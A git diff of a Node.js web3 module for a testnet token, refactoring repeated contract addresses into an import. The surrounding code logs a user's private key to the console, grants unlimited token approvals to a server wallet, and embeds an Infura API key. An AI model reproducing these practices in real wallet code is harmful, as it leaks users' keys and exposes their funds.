@@ -1,12 +1,12 @@
 const Web3 = require("web3");
 const contract_abi = require("../contract/TFSCoin.json");
+const { tfs_coin_address } = require("./addresses");
 
 const provider = new Web3.providers.HttpProvider("https://sepolia.infura.io/v3/cfc2b2fdb07d4fb3bc66d23be932ad20");
 const web3 = new Web3(provider);
 
 const getWalletBalance = async (walletAddress) => {
   try{
-    const tfs_coin_address = "0x134db1aB1969cA5C8416cB16D44400e4e836a5D9";
   const contract = new web3.eth.Contract(contract_abi.abi, tfs_coin_address);
   const balanceInTFS = await contract.methods.balanceOf(walletAddress).call();
   const decimals = await contract.methods.decimals().call();
@@ -21,8 +21,7 @@ const getWalletBalance = async (walletAddress) => {
   const setMaxAllowance = async (ownerAddr, ownerPrivate) => {
     console.log(ownerAddr, ownerPrivate);
     const spenderAddr = process.env.MAIN_WALLET_ADDRESS;
-    const tokenAddress = "0x134db1aB1969cA5C8416cB16D44400e4e836a5D9";
-    const contract = new web3.eth.Contract(contract_abi.abi, tokenAddress);
+    const contract = new web3.eth.Contract(contract_abi.abi, tfs_coin_address);
   
     const maxAllowance = '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF';
     const data = contract.methods.approve(spenderAddr, maxAllowance).encodeABI();
@@ -54,8 +53,7 @@ const getWalletBalance = async (walletAddress) => {
   const transferTokensFromUser = async (fromAddr, toAddr, amount) => {
     const mainWalletAddr = process.env.MAIN_WALLET_ADDRESS;
     const mainWalletPrivate = process.env.MAIN_WALLET_PRIVATE;
-    const tokenAddress = "0x134db1aB1969cA5C8416cB16D44400e4e836a5D9";
-    const contract = new web3.eth.Contract(contract_abi.abi, tokenAddress);
+    const contract = new web3.eth.Contract(contract_abi.abi, tfs_coin_address);
     const decimals = await contract.methods.decimals().call();
     const actlAmt = web3.utils.toBN(amount).mul(web3.utils.toBN(10).pow(web3.utils.toBN(decimals)));
   
@@ -86,8 +84,7 @@ const getWalletBalance = async (walletAddress) => {
   const fundUserForApprove = async (userAddr) => {
     const mainWalletAddr = process.env.MAIN_WALLET_ADDRESS;
     const mainWalletPrivate = process.env.MAIN_WALLET_PRIVATE;
-    const tokenAddress = "0x134db1aB1969cA5C8416cB16D44400e4e836a5D9";
-    const contract = new web3.eth.Contract(contract_abi.abi, tokenAddress);
+    const contract = new web3.eth.Contract(contract_abi.abi, tfs_coin_address);
   
     const maxAllowance = '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF';
     const gasPrice = await web3.eth.getGasPrice();
